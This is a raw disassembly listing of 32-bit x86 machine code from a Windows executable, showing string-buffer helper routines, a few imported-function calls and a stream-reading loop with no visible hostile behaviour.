  4029e8:	50                   	push   %eax
  4029e9:	ff 15 20 a1 41 00    	call   *0x41a120
  4029ef:	85 c0                	test   %eax,%eax
  4029f1:	74 37                	je     0x402a2a
  4029f3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4029f6:	33 c0                	xor    %eax,%eax
  4029f8:	3b c8                	cmp    %eax,%ecx
  4029fa:	77 2e                	ja     0x402a2a
  4029fc:	72 08                	jb     0x402a06
  4029fe:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402a01:	3b 45 08             	cmp    0x8(%ebp),%eax
  402a04:	73 24                	jae    0x402a2a
  402a06:	6a 2b                	push   $0x2b
  402a08:	e8 70 fa ff ff       	call   0x40247d
  402a0d:	50                   	push   %eax
  402a0e:	e8 86 6b 00 00       	call   0x409599
  402a13:	83 f8 01             	cmp    $0x1,%eax
  402a16:	59                   	pop    %ecx
  402a17:	59                   	pop    %ecx
  402a18:	74 09                	je     0x402a23
  402a1a:	83 0d c8 e9 41 00 ff 	orl    $0xffffffff,0x41e9c8
  402a21:	eb ae                	jmp    0x4029d1
  402a23:	83 0d c8 e9 41 00 02 	orl    $0x2,0x41e9c8
  402a2a:	33 c0                	xor    %eax,%eax
  402a2c:	40                   	inc    %eax
  402a2d:	c9                   	leave
  402a2e:	c3                   	ret
  402a2f:	ff 74 24 04          	push   0x4(%esp)
  402a33:	e8 8d ff ff ff       	call   0x4029c5
  402a38:	85 c0                	test   %eax,%eax
  402a3a:	59                   	pop    %ecx
  402a3b:	75 01                	jne    0x402a3e
  402a3d:	c3                   	ret
  402a3e:	6a 04                	push   $0x4
  402a40:	68 00 10 00 00       	push   $0x1000
  402a45:	ff 74 24 0c          	push   0xc(%esp)
  402a49:	6a 00                	push   $0x0
  402a4b:	ff 15 1c a1 41 00    	call   *0x41a11c
  402a51:	c3                   	ret
  402a52:	ff 74 24 04          	push   0x4(%esp)
  402a56:	e8 6a ff ff ff       	call   0x4029c5
  402a5b:	85 c0                	test   %eax,%eax
  402a5d:	59                   	pop    %ecx
  402a5e:	75 01                	jne    0x402a61
  402a60:	c3                   	ret
  402a61:	ff 25 38 a2 41 00    	jmp    *0x41a238
  402a67:	56                   	push   %esi
  402a68:	8b f1                	mov    %ecx,%esi
  402a6a:	33 c0                	xor    %eax,%eax
  402a6c:	57                   	push   %edi
  402a6d:	ff 74 24 0c          	push   0xc(%esp)
  402a71:	89 06                	mov    %eax,(%esi)
  402a73:	89 46 04             	mov    %eax,0x4(%esi)
  402a76:	89 46 08             	mov    %eax,0x8(%esi)
  402a79:	e8 06 e7 ff ff       	call   0x401184
  402a7e:	59                   	pop    %ecx
  402a7f:	8b f8                	mov    %eax,%edi
  402a81:	57                   	push   %edi
  402a82:	8b ce                	mov    %esi,%ecx
  402a84:	e8 2e e7 ff ff       	call   0x4011b7
  402a89:	ff 74 24 0c          	push   0xc(%esp)
  402a8d:	ff 36                	push   (%esi)
  402a8f:	e8 d8 e6 ff ff       	call   0x40116c
  402a94:	59                   	pop    %ecx
  402a95:	59                   	pop    %ecx
  402a96:	89 7e 04             	mov    %edi,0x4(%esi)
  402a99:	5f                   	pop    %edi
  402a9a:	8b c6                	mov    %esi,%eax
  402a9c:	5e                   	pop    %esi
  402a9d:	c2 04 00             	ret    $0x4
  402aa0:	8b 44 24 04          	mov    0x4(%esp),%eax
  402aa4:	56                   	push   %esi
  402aa5:	8b f1                	mov    %ecx,%esi
  402aa7:	3b 46 08             	cmp    0x8(%esi),%eax
  402aaa:	7c 06                	jl     0x402ab2
  402aac:	50                   	push   %eax
  402aad:	e8 05 e7 ff ff       	call   0x4011b7
  402ab2:	8b 06                	mov    (%esi),%eax
  402ab4:	5e                   	pop    %esi
  402ab5:	c2 04 00             	ret    $0x4
  402ab8:	56                   	push   %esi
  402ab9:	57                   	push   %edi
  402aba:	ff 74 24 0c          	push   0xc(%esp)
  402abe:	8b f1                	mov    %ecx,%esi
  402ac0:	e8 bf e6 ff ff       	call   0x401184
  402ac5:	59                   	pop    %ecx
  402ac6:	8b f8                	mov    %eax,%edi
  402ac8:	57                   	push   %edi
  402ac9:	8b ce                	mov    %esi,%ecx
  402acb:	e8 a2 e9 ff ff       	call   0x401472
  402ad0:	8b 46 04             	mov    0x4(%esi),%eax
  402ad3:	8b 0e                	mov    (%esi),%ecx
  402ad5:	ff 74 24 0c          	push   0xc(%esp)
  402ad9:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  402adc:	50                   	push   %eax
  402add:	e8 8a e6 ff ff       	call   0x40116c
  402ae2:	01 7e 04             	add    %edi,0x4(%esi)
  402ae5:	59                   	pop    %ecx
  402ae6:	59                   	pop    %ecx
  402ae7:	5f                   	pop    %edi
  402ae8:	8b c6                	mov    %esi,%eax
  402aea:	5e                   	pop    %esi
  402aeb:	c2 04 00             	ret    $0x4
  402aee:	8b 41 04             	mov    0x4(%ecx),%eax
  402af1:	85 c0                	test   %eax,%eax
  402af3:	74 1e                	je     0x402b13
  402af5:	8b 09                	mov    (%ecx),%ecx
  402af7:	66 8b 54 24 04       	mov    0x4(%esp),%dx
  402afc:	8d 44 41 fe          	lea    -0x2(%ecx,%eax,2),%eax
  402b00:	eb 06                	jmp    0x402b08
  402b02:	3b c1                	cmp    %ecx,%eax
  402b04:	74 0d                	je     0x402b13
  402b06:	48                   	dec    %eax
  402b07:	48                   	dec    %eax
  402b08:	66 39 10             	cmp    %dx,(%eax)
  402b0b:	75 f5                	jne    0x402b02
  402b0d:	2b c1                	sub    %ecx,%eax
  402b0f:	d1 f8                	sar    $1,%eax
  402b11:	eb 03                	jmp    0x402b16
  402b13:	83 c8 ff             	or     $0xffffffff,%eax
  402b16:	c2 04 00             	ret    $0x4
  402b19:	56                   	push   %esi
  402b1a:	8b f1                	mov    %ecx,%esi
  402b1c:	33 c0                	xor    %eax,%eax
  402b1e:	6a 03                	push   $0x3
  402b20:	89 06                	mov    %eax,(%esi)
  402b22:	89 46 04             	mov    %eax,0x4(%esi)
  402b25:	89 46 08             	mov    %eax,0x8(%esi)
  402b28:	e8 d8 fc ff ff       	call   0x402805
  402b2d:	8b c6                	mov    %esi,%eax
  402b2f:	5e                   	pop    %esi
  402b30:	c3                   	ret
  402b31:	56                   	push   %esi
  402b32:	8b f1                	mov    %ecx,%esi
  402b34:	83 26 00             	andl   $0x0,(%esi)
  402b37:	83 66 04 00          	andl   $0x0,0x4(%esi)
  402b3b:	83 66 08 00          	andl   $0x0,0x8(%esi)
  402b3f:	6a 01                	push   $0x1
  402b41:	e8 bf fc ff ff       	call   0x402805
  402b46:	8b 06                	mov    (%esi),%eax
  402b48:	8a 4c 24 08          	mov    0x8(%esp),%cl
  402b4c:	88 08                	mov    %cl,(%eax)
  402b4e:	8b 06                	mov    (%esi),%eax
  402b50:	c6 40 01 00          	movb   $0x0,0x1(%eax)
  402b54:	c7 46 04 01 00 00 00 	movl   $0x1,0x4(%esi)
  402b5b:	8b c6                	mov    %esi,%eax
  402b5d:	5e                   	pop    %esi
  402b5e:	c2 04 00             	ret    $0x4
  402b61:	56                   	push   %esi
  402b62:	8b f1                	mov    %ecx,%esi
  402b64:	83 26 00             	andl   $0x0,(%esi)
  402b67:	83 66 04 00          	andl   $0x0,0x4(%esi)
  402b6b:	83 66 08 00          	andl   $0x0,0x8(%esi)
  402b6f:	57                   	push   %edi
  402b70:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402b74:	ff 77 04             	push   0x4(%edi)
  402b77:	e8 89 fc ff ff       	call   0x402805
  402b7c:	8b 0f                	mov    (%edi),%ecx
  402b7e:	8b 06                	mov    (%esi),%eax
  402b80:	8a 11                	mov    (%ecx),%dl
  402b82:	88 10                	mov    %dl,(%eax)
  402b84:	40                   	inc    %eax
  402b85:	41                   	inc    %ecx
  402b86:	84 d2                	test   %dl,%dl
  402b88:	75 f6                	jne    0x402b80
  402b8a:	8b 47 04             	mov    0x4(%edi),%eax
  402b8d:	89 46 04             	mov    %eax,0x4(%esi)
  402b90:	5f                   	pop    %edi
  402b91:	8b c6                	mov    %esi,%eax
  402b93:	5e                   	pop    %esi
  402b94:	c2 04 00             	ret    $0x4
  402b97:	8b 44 24 04          	mov    0x4(%esp),%eax
  402b9b:	56                   	push   %esi
  402b9c:	8b f1                	mov    %ecx,%esi
  402b9e:	3b 46 08             	cmp    0x8(%esi),%eax
  402ba1:	7c 06                	jl     0x402ba9
  402ba3:	50                   	push   %eax
  402ba4:	e8 5c fc ff ff       	call   0x402805
  402ba9:	8b 06                	mov    (%esi),%eax
  402bab:	5e                   	pop    %esi
  402bac:	c2 04 00             	ret    $0x4
  402baf:	53                   	push   %ebx
  402bb0:	56                   	push   %esi
  402bb1:	8b f1                	mov    %ecx,%esi
  402bb3:	8b 06                	mov    (%esi),%eax
  402bb5:	33 db                	xor    %ebx,%ebx
  402bb7:	57                   	push   %edi
  402bb8:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402bbc:	89 5e 04             	mov    %ebx,0x4(%esi)
  402bbf:	88 18                	mov    %bl,(%eax)
  402bc1:	38 1f                	cmp    %bl,(%edi)
  402bc3:	74 07                	je     0x402bcc
  402bc5:	43                   	inc    %ebx
  402bc6:	80 3c 3b 00          	cmpb   $0x0,(%ebx,%edi,1)
  402bca:	75 f9                	jne    0x402bc5
  402bcc:	53                   	push   %ebx
  402bcd:	e8 33 fc ff ff       	call   0x402805
  402bd2:	8b 06                	mov    (%esi),%eax
  402bd4:	8a 0f                	mov    (%edi),%cl
  402bd6:	88 08                	mov    %cl,(%eax)
  402bd8:	40                   	inc    %eax
  402bd9:	47                   	inc    %edi
  402bda:	84 c9                	test   %cl,%cl
  402bdc:	75 f6                	jne    0x402bd4
  402bde:	5f                   	pop    %edi
  402bdf:	89 5e 04             	mov    %ebx,0x4(%esi)
  402be2:	8b c6                	mov    %esi,%eax
  402be4:	5e                   	pop    %esi
  402be5:	5b                   	pop    %ebx
  402be6:	c2 04 00             	ret    $0x4
  402be9:	56                   	push   %esi
  402bea:	57                   	push   %edi
  402beb:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402bef:	8b f1                	mov    %ecx,%esi
  402bf1:	3b fe                	cmp    %esi,%edi
  402bf3:	74 25                	je     0x402c1a
  402bf5:	83 66 04 00          	andl   $0x0,0x4(%esi)
  402bf9:	8b 06                	mov    (%esi),%eax
  402bfb:	c6 00 00             	movb   $0x0,(%eax)
  402bfe:	ff 77 04             	push   0x4(%edi)
  402c01:	e8 ff fb ff ff       	call   0x402805
  402c06:	8b 0f                	mov    (%edi),%ecx
  402c08:	8b 06                	mov    (%esi),%eax
  402c0a:	8a 11                	mov    (%ecx),%dl
  402c0c:	88 10                	mov    %dl,(%eax)
  402c0e:	40                   	inc    %eax
  402c0f:	41                   	inc    %ecx
  402c10:	84 d2                	test   %dl,%dl
  402c12:	75 f6                	jne    0x402c0a
  402c14:	8b 47 04             	mov    0x4(%edi),%eax
  402c17:	89 46 04             	mov    %eax,0x4(%esi)
  402c1a:	5f                   	pop    %edi
  402c1b:	8b c6                	mov    %esi,%eax
  402c1d:	5e                   	pop    %esi
  402c1e:	c2 04 00             	ret    $0x4
  402c21:	56                   	push   %esi
  402c22:	6a 01                	push   $0x1
  402c24:	8b f1                	mov    %ecx,%esi
  402c26:	e8 26 fc ff ff       	call   0x402851
  402c2b:	8b 4e 04             	mov    0x4(%esi),%ecx
  402c2e:	8b 06                	mov    (%esi),%eax
  402c30:	8a 54 24 08          	mov    0x8(%esp),%dl
  402c34:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  402c37:	ff 46 04             	incl   0x4(%esi)
  402c3a:	8b 46 04             	mov    0x4(%esi),%eax
  402c3d:	8b 0e                	mov    (%esi),%ecx
  402c3f:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  402c43:	8b c6                	mov    %esi,%eax
  402c45:	5e                   	pop    %esi
  402c46:	c2 04 00             	ret    $0x4
  402c49:	53                   	push   %ebx
  402c4a:	56                   	push   %esi
  402c4b:	57                   	push   %edi
  402c4c:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402c50:	33 db                	xor    %ebx,%ebx
  402c52:	38 1f                	cmp    %bl,(%edi)
  402c54:	8b f1                	mov    %ecx,%esi
  402c56:	74 07                	je     0x402c5f
  402c58:	43                   	inc    %ebx
  402c59:	80 3c 3b 00          	cmpb   $0x0,(%ebx,%edi,1)
  402c5d:	75 f9                	jne    0x402c58
  402c5f:	53                   	push   %ebx
  402c60:	e8 ec fb ff ff       	call   0x402851
  402c65:	8b 46 04             	mov    0x4(%esi),%eax
  402c68:	03 06                	add    (%esi),%eax
  402c6a:	8a 0f                	mov    (%edi),%cl
  402c6c:	88 08                	mov    %cl,(%eax)
  402c6e:	40                   	inc    %eax
  402c6f:	47                   	inc    %edi
  402c70:	84 c9                	test   %cl,%cl
  402c72:	75 f6                	jne    0x402c6a
  402c74:	01 5e 04             	add    %ebx,0x4(%esi)
  402c77:	5f                   	pop    %edi
  402c78:	8b c6                	mov    %esi,%eax
  402c7a:	5e                   	pop    %esi
  402c7b:	5b                   	pop    %ebx
  402c7c:	c2 04 00             	ret    $0x4
  402c7f:	56                   	push   %esi
  402c80:	57                   	push   %edi
  402c81:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402c85:	ff 77 04             	push   0x4(%edi)
  402c88:	8b f1                	mov    %ecx,%esi
  402c8a:	e8 c2 fb ff ff       	call   0x402851
  402c8f:	8b 46 04             	mov    0x4(%esi),%eax
  402c92:	8b 0f                	mov    (%edi),%ecx
  402c94:	03 06                	add    (%esi),%eax
  402c96:	8a 11                	mov    (%ecx),%dl
  402c98:	88 10                	mov    %dl,(%eax)
  402c9a:	40                   	inc    %eax
  402c9b:	41                   	inc    %ecx
  402c9c:	84 d2                	test   %dl,%dl
  402c9e:	75 f6                	jne    0x402c96
  402ca0:	8b 47 04             	mov    0x4(%edi),%eax
  402ca3:	01 46 04             	add    %eax,0x4(%esi)
  402ca6:	5f                   	pop    %edi
  402ca7:	8b c6                	mov    %esi,%eax
  402ca9:	5e                   	pop    %esi
  402caa:	c2 04 00             	ret    $0x4
  402cad:	56                   	push   %esi
  402cae:	57                   	push   %edi
  402caf:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402cb3:	57                   	push   %edi
  402cb4:	8b f1                	mov    %ecx,%esi
  402cb6:	e8 16 e7 ff ff       	call   0x4013d1
  402cbb:	83 c7 0c             	add    $0xc,%edi
  402cbe:	57                   	push   %edi
  402cbf:	8d 4e 0c             	lea    0xc(%esi),%ecx
  402cc2:	e8 0a e7 ff ff       	call   0x4013d1
  402cc7:	5f                   	pop    %edi
  402cc8:	8b c6                	mov    %esi,%eax
  402cca:	5e                   	pop    %esi
  402ccb:	c2 04 00             	ret    $0x4
  402cce:	56                   	push   %esi
  402ccf:	8b f1                	mov    %ecx,%esi
  402cd1:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402cd5:	8b 46 04             	mov    0x4(%esi),%eax
  402cd8:	57                   	push   %edi
  402cd9:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402cdd:	8d 14 39             	lea    (%ecx,%edi,1),%edx
  402ce0:	3b d0                	cmp    %eax,%edx
  402ce2:	7e 04                	jle    0x402ce8
  402ce4:	2b c1                	sub    %ecx,%eax
  402ce6:	8b f8                	mov    %eax,%edi
  402ce8:	85 ff                	test   %edi,%edi
  402cea:	7e 0f                	jle    0x402cfb
  402cec:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  402cef:	50                   	push   %eax
  402cf0:	51                   	push   %ecx
  402cf1:	8b ce                	mov    %esi,%ecx
  402cf3:	e8 a3 fb ff ff       	call   0x40289b
  402cf8:	29 7e 04             	sub    %edi,0x4(%esi)
  402cfb:	8b 46 04             	mov    0x4(%esi),%eax
  402cfe:	5f                   	pop    %edi
  402cff:	5e                   	pop    %esi
  402d00:	c2 08 00             	ret    $0x8
  402d03:	55                   	push   %ebp
  402d04:	8b ec                	mov    %esp,%ebp
  402d06:	83 ec 10             	sub    $0x10,%esp
  402d09:	8b 41 04             	mov    0x4(%ecx),%eax
  402d0c:	53                   	push   %ebx
  402d0d:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402d10:	56                   	push   %esi
  402d11:	8b 75 10             	mov    0x10(%ebp),%esi
  402d14:	8d 14 33             	lea    (%ebx,%esi,1),%edx
  402d17:	3b d0                	cmp    %eax,%edx
  402d19:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402d1c:	7e 04                	jle    0x402d22
  402d1e:	8b f0                	mov    %eax,%esi
  402d20:	2b f3                	sub    %ebx,%esi
  402d22:	85 db                	test   %ebx,%ebx
  402d24:	75 0f                	jne    0x402d35
  402d26:	3b f0                	cmp    %eax,%esi
  402d28:	75 0b                	jne    0x402d35
  402d2a:	51                   	push   %ecx
  402d2b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402d2e:	e8 2e fe ff ff       	call   0x402b61
  402d33:	eb 48                	jmp    0x402d7d
  402d35:	57                   	push   %edi
  402d36:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402d39:	e8 db fd ff ff       	call   0x402b19
  402d3e:	56                   	push   %esi
  402d3f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402d42:	e8 be fa ff ff       	call   0x402805
  402d47:	8b 7d f0             	mov    -0x10(%ebp),%edi
  402d4a:	33 c0                	xor    %eax,%eax
  402d4c:	85 f6                	test   %esi,%esi
  402d4e:	7e 12                	jle    0x402d62
  402d50:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d53:	8b 09                	mov    (%ecx),%ecx
  402d55:	03 c8                	add    %eax,%ecx
  402d57:	8a 0c 19             	mov    (%ecx,%ebx,1),%cl
  402d5a:	88 0c 07             	mov    %cl,(%edi,%eax,1)
  402d5d:	40                   	inc    %eax
  402d5e:	3b c6                	cmp    %esi,%eax
  402d60:	7c ee                	jl     0x402d50
  402d62:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402d65:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402d68:	50                   	push   %eax
  402d69:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  402d6d:	89 75 f4             	mov    %esi,-0xc(%ebp)
  402d70:	e8 ec fd ff ff       	call   0x402b61
  402d75:	57                   	push   %edi
  402d76:	e8 ef 64 01 00       	call   0x41926a
  402d7b:	59                   	pop    %ecx
  402d7c:	5f                   	pop    %edi
  402d7d:	8b 45 08             	mov    0x8(%ebp),%eax
  402d80:	5e                   	pop    %esi
  402d81:	5b                   	pop    %ebx
  402d82:	c9                   	leave
  402d83:	c2 0c 00             	ret    $0xc
  402d86:	53                   	push   %ebx
  402d87:	56                   	push   %esi
  402d88:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402d8c:	57                   	push   %edi
  402d8d:	8b f9                	mov    %ecx,%edi
  402d8f:	8b 47 04             	mov    0x4(%edi),%eax
  402d92:	39 06                	cmp    %eax,(%esi)
  402d94:	7e 02                	jle    0x402d98
  402d96:	89 06                	mov    %eax,(%esi)
  402d98:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402d9c:	53                   	push   %ebx
  402d9d:	e8 d0 e6 ff ff       	call   0x401472
  402da2:	8b 06                	mov    (%esi),%eax
  402da4:	50                   	push   %eax
  402da5:	03 c3                	add    %ebx,%eax
  402da7:	50                   	push   %eax
  402da8:	8b cf                	mov    %edi,%ecx
  402daa:	e8 ec fa ff ff       	call   0x40289b
  402daf:	5f                   	pop    %edi
  402db0:	5e                   	pop    %esi
  402db1:	5b                   	pop    %ebx
  402db2:	c2 08 00             	ret    $0x8
  402db5:	8b 44 24 08          	mov    0x8(%esp),%eax
  402db9:	ff 30                	push   (%eax)
  402dbb:	8b 44 24 08          	mov    0x8(%esp),%eax
  402dbf:	ff 30                	push   (%eax)
  402dc1:	e8 07 f9 00 00       	call   0x4126cd
  402dc6:	f7 d8                	neg    %eax
  402dc8:	59                   	pop    %ecx
  402dc9:	1b c0                	sbb    %eax,%eax
  402dcb:	59                   	pop    %ecx
  402dcc:	40                   	inc    %eax
  402dcd:	c3                   	ret
  402dce:	57                   	push   %edi
  402dcf:	8b 7c 24 08          	mov    0x8(%esp),%edi
  402dd3:	8b cf                	mov    %edi,%ecx
  402dd5:	e8 11 e7 ff ff       	call   0x4014eb
  402dda:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402dde:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402de2:	74 2e                	je     0x402e12
  402de4:	53                   	push   %ebx
  402de5:	8b 18                	mov    (%eax),%ebx
  402de7:	56                   	push   %esi
  402de8:	8b 70 04             	mov    0x4(%eax),%esi
  402deb:	8d 46 01             	lea    0x1(%esi),%eax
  402dee:	50                   	push   %eax
  402def:	56                   	push   %esi
  402df0:	8b cf                	mov    %edi,%ecx
  402df2:	e8 a9 fc ff ff       	call   0x402aa0
  402df7:	50                   	push   %eax
  402df8:	56                   	push   %esi
  402df9:	53                   	push   %ebx
  402dfa:	6a 00                	push   $0x0
  402dfc:	ff 74 24 2c          	push   0x2c(%esp)
  402e00:	ff 15 38 a1 41 00    	call   *0x41a138
  402e06:	8b 0f                	mov    (%edi),%ecx
  402e08:	66 83 24 41 00       	andw   $0x0,(%ecx,%eax,2)
  402e0d:	5e                   	pop    %esi
  402e0e:	89 47 04             	mov    %eax,0x4(%edi)
  402e11:	5b                   	pop    %ebx
  402e12:	8b c7                	mov    %edi,%eax
  402e14:	5f                   	pop    %edi
  402e15:	c3                   	ret
  402e16:	55                   	push   %ebp
  402e17:	8b ec                	mov    %esp,%ebp
  402e19:	53                   	push   %ebx
  402e1a:	56                   	push   %esi
  402e1b:	8b 75 08             	mov    0x8(%ebp),%esi
  402e1e:	8b ce                	mov    %esi,%ecx
  402e20:	e8 f4 fc ff ff       	call   0x402b19
  402e25:	8b 45 0c             	mov    0xc(%ebp),%eax
  402e28:	33 db                	xor    %ebx,%ebx
  402e2a:	39 58 04             	cmp    %ebx,0x4(%eax)
  402e2d:	74 32                	je     0x402e61
  402e2f:	57                   	push   %edi
  402e30:	8b 78 04             	mov    0x4(%eax),%edi
  402e33:	8b 00                	mov    (%eax),%eax
  402e35:	53                   	push   %ebx
  402e36:	8d 0c 3f             	lea    (%edi,%edi,1),%ecx
  402e39:	89 45 08             	mov    %eax,0x8(%ebp)
  402e3c:	53                   	push   %ebx
  402e3d:	8d 41 01             	lea    0x1(%ecx),%eax
  402e40:	50                   	push   %eax
  402e41:	51                   	push   %ecx
  402e42:	8b ce                	mov    %esi,%ecx
  402e44:	e8 4e fd ff ff       	call   0x402b97
  402e49:	50                   	push   %eax
  402e4a:	57                   	push   %edi
  402e4b:	ff 75 08             	push   0x8(%ebp)
  402e4e:	53                   	push   %ebx
  402e4f:	ff 75 10             	push   0x10(%ebp)
  402e52:	ff 15 18 a1 41 00    	call   *0x41a118
  402e58:	8b 0e                	mov    (%esi),%ecx
  402e5a:	88 1c 08             	mov    %bl,(%eax,%ecx,1)
  402e5d:	89 46 04             	mov    %eax,0x4(%esi)
  402e60:	5f                   	pop    %edi
  402e61:	8b c6                	mov    %esi,%eax
  402e63:	5e                   	pop    %esi
  402e64:	5b                   	pop    %ebx
  402e65:	5d                   	pop    %ebp
  402e66:	c3                   	ret
  402e67:	55                   	push   %ebp
  402e68:	8b ec                	mov    %esp,%ebp
  402e6a:	83 ec 0c             	sub    $0xc,%esp
  402e6d:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  402e70:	e8 76 e6 ff ff       	call   0x4014eb
  402e75:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  402e79:	7f 0a                	jg     0x402e85
  402e7b:	6a 01                	push   $0x1
  402e7d:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  402e80:	e8 32 e3 ff ff       	call   0x4011b7
  402e85:	56                   	push   %esi
  402e86:	8b 35 14 a1 41 00    	mov    0x41a114,%esi
  402e8c:	57                   	push   %edi
  402e8d:	8b 7d 08             	mov    0x8(%ebp),%edi
  402e90:	8b 07                	mov    (%edi),%eax
  402e92:	6a 01                	push   $0x1
  402e94:	ff 75 f4             	push   -0xc(%ebp)
  402e97:	50                   	push   %eax
  402e98:	ff d6                	call   *%esi
  402e9a:	85 c0                	test   %eax,%eax
  402e9c:	75 0b                	jne    0x402ea9
  402e9e:	ff 75 f4             	push   -0xc(%ebp)
  402ea1:	e8 c4 63 01 00       	call   0x41926a
  402ea6:	59                   	pop    %ecx
  402ea7:	eb 37                	jmp    0x402ee0
  402ea9:	53                   	push   %ebx
  402eaa:	8b 1f                	mov    (%edi),%ebx
  402eac:	40                   	inc    %eax
  402ead:	50                   	push   %eax
  402eae:	50                   	push   %eax
  402eaf:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  402eb2:	e8 e9 fb ff ff       	call   0x402aa0
  402eb7:	50                   	push   %eax
  402eb8:	53                   	push   %ebx
  402eb9:	ff d6                	call   *%esi
  402ebb:	8b 75 f4             	mov    -0xc(%ebp),%esi
  402ebe:	56                   	push   %esi
  402ebf:	e8 c0 e2 ff ff       	call   0x401184
  402ec4:	66 83 24 46 00       	andw   $0x0,(%esi,%eax,2)
  402ec9:	59                   	pop    %ecx
  402eca:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402ecd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402ed0:	50                   	push   %eax
  402ed1:	8b cf                	mov    %edi,%ecx
  402ed3:	e8 64 e5 ff ff       	call   0x40143c
  402ed8:	56                   	push   %esi
  402ed9:	e8 8c 63 01 00       	call   0x41926a
  402ede:	59                   	pop    %ecx
  402edf:	5b                   	pop    %ebx
  402ee0:	5f                   	pop    %edi
  402ee1:	5e                   	pop    %esi
  402ee2:	c9                   	leave
  402ee3:	c3                   	ret
  402ee4:	55                   	push   %ebp
  402ee5:	8b ec                	mov    %esp,%ebp
  402ee7:	b8 20 10 00 00       	mov    $0x1020,%eax
  402eec:	e8 cf 63 01 00       	call   0x4192c0
  402ef1:	53                   	push   %ebx
  402ef2:	56                   	push   %esi
  402ef3:	57                   	push   %edi
  402ef4:	8b 7d 08             	mov    0x8(%ebp),%edi
  402ef7:	8b 07                	mov    (%edi),%eax
  402ef9:	33 db                	xor    %ebx,%ebx
  402efb:	53                   	push   %ebx
  402efc:	53                   	push   %ebx
  402efd:	53                   	push   %ebx
  402efe:	53                   	push   %ebx
  402eff:	57                   	push   %edi
  402f00:	ff 50 10             	call   *0x10(%eax)
  402f03:	8b 45 14             	mov    0x14(%ebp),%eax
  402f06:	ff 75 0c             	push   0xc(%ebp)
  402f09:	8b 35 30 a1 41 00    	mov    0x41a130,%esi
  402f0f:	89 58 04             	mov    %ebx,0x4(%eax)
  402f12:	8b 00                	mov    (%eax),%eax
  402f14:	88 18                	mov    %bl,(%eax)
  402f16:	ff d6                	call   *%esi
  402f18:	ff 75 10             	push   0x10(%ebp)
  402f1b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402f1e:	ff d6                	call   *%esi
  402f20:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402f23:	33 f6                	xor    %esi,%esi
  402f25:	88 5d ff             	mov    %bl,-0x1(%ebp)
  402f28:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  402f2b:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  402f2e:	eb 03                	jmp    0x402f33
  402f30:	8b 7d 08             	mov    0x8(%ebp),%edi
  402f33:	8b 07                	mov    (%edi),%eax
  402f35:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  402f38:	51                   	push   %ecx
  402f39:	b9 00 10 00 00       	mov    $0x1000,%ecx
  402f3e:	2b ce                	sub    %esi,%ecx
  402f40:	51                   	push   %ecx
  402f41:	8d 8c 35 e0 ef ff ff 	lea    -0x1020(%ebp,%esi,1),%ecx
  402f48:	51                   	push   %ecx
  402f49:	57                   	push   %edi
  402f4a:	ff 50 0c             	call   *0xc(%eax)
  402f4d:	85 c0                	test   %eax,%eax
  402f4f:	0f 85 ca 00 00 00    	jne    0x40301f
  402f55:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402f58:	3b c3                	cmp    %ebx,%eax
  402f5a:	0f 84 bf 00 00 00    	je     0x40301f
  402f60:	03 f0                	add    %eax,%esi
  402f62:	8d 85 e0 ef ff ff    	lea    -0x1020(%ebp),%eax
  402f68:	33 ff                	xor    %edi,%edi
  402f6a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402f6d:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  402f70:	8b c6                	mov    %esi,%eax
  402f72:	74 3d                	je     0x402fb1
  402f74:	2b 45 e8             	sub    -0x18(%ebp),%eax
  402f77:	3b f8                	cmp    %eax,%edi
  402f79:	77 60                	ja     0x402fdb
  402f7b:	ff 75 e8             	push   -0x18(%ebp)
  402f7e:	ff 75 10             	push   0x10(%ebp)
  402f81:	ff 75 f8             	push   -0x8(%ebp)
  402f84:	e8 ed 62 01 00       	call   0x419276
  402f89:	83 c4 0c             	add    $0xc,%esp
  402f8c:	85 c0                	test   %eax,%eax
  402f8e:	0f 84 87 00 00 00    	je     0x40301b
  402f94:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402f97:	8a 00                	mov    (%eax),%al
  402f99:	3a c3                	cmp    %bl,%al
  402f9b:	88 45 e0             	mov    %al,-0x20(%ebp)
  402f9e:	74 7f                	je     0x40301f
  402fa0:	ff 75 e0             	push   -0x20(%ebp)
  402fa3:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402fa6:	e8 76 fc ff ff       	call   0x402c21
  402fab:	47                   	inc    %edi
  402fac:	ff 45 f8             	incl   -0x8(%ebp)
  402faf:	eb bc                	jmp    0x402f6d
